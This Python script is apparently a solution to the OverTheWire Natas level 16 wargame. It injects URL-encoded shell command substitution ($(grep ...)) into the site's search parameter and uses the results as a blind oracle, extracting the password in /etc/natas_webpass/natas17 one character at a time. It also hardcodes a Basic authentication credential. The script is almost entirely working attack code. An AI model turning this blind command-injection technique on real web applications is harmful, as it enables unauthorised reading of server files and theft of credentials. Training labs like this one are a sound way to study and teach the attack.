import requests
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth
from string import ascii_lowercase
from string import ascii_uppercase
import time

#   $(grep -v -E ^[[:alnum:]]{i}char(i)[[:alnum:]]{max-1-i}$)Africa

char_well = ascii_lowercase+ascii_uppercase+'0123456789'
strained_chars = '' 
semaphore=0
char_num=0
while(semaphore==0):
    char_num=char_num+1
    print('Doing: '+str(char_num))
    payload='%24%28grep+%2Dv+%2DE+%5E%5B%5B%3Aalnum%3A%5D%5D%7B'+str(char_num)+'%7D%24+%2Fetc%2Fnatas_webpass%2Fnatas17%29Africa'
    link='http://natas16.natas.labs.overthewire.org/?needle='+payload+'&submit=Search'
    head={'Host': 'natas16.natas.labs.overthewire.org'\
    ,'Accept-Encoding': 'gzip, deflate'\
    ,'DNT': '1'\
    ,'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='}
    req = requests.get(link, headers=head)
    soup = BeautifulSoup(req.text, 'html.parser')
    search_output= soup.body.div.pre.string
    if(search_output!='\n'):
        semaphore=1
    time.sleep(.300)

print('Seems that the password is '+str(char_num)+' chars long')

password=''
for i in range(char_num):
    for char in char_well: 
        print('Doing: '+char+' of '+str(i))
        if(i==0):
            payload='%24%28grep+%2Dv+%2DE+%5E%5E%5B'+char+'%5D%5B%5B%3Aalnum%3A%5D%5D%7B'+str(char_num-1)+'%7D%24+%2Fetc%2Fnatas_webpass%2Fnatas17%29Africa'
        else:
            payload='%24%28grep+%2Dv+%2DE+%5E%5B%5B%3Aalnum%3A%5D%5D%7B'+str(i)+'%7D%5B'+char+'%5D%5B%5B%3Aalnum%3A%5D%5D%7B'+str(char_num-1-i)+'%7D%24+%2Fetc%2Fnatas_webpass%2Fnatas17%29Africa'

        link='http://natas16.natas.labs.overthewire.org/?needle='+payload+'&submit=Search'
        head={'Host': 'natas16.natas.labs.overthewire.org'\
        ,'Accept-Encoding': 'gzip, deflate'\
        ,'DNT': '1'\
        ,'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='}
        req = requests.get(link, headers=head)
        soup = BeautifulSoup(req.text, 'html.parser')
        search_output= soup.body.div.pre.string
        if(search_output!='\n'):
            print(char)
            password=password+char
            break
        time.sleep(.300)

print(password)
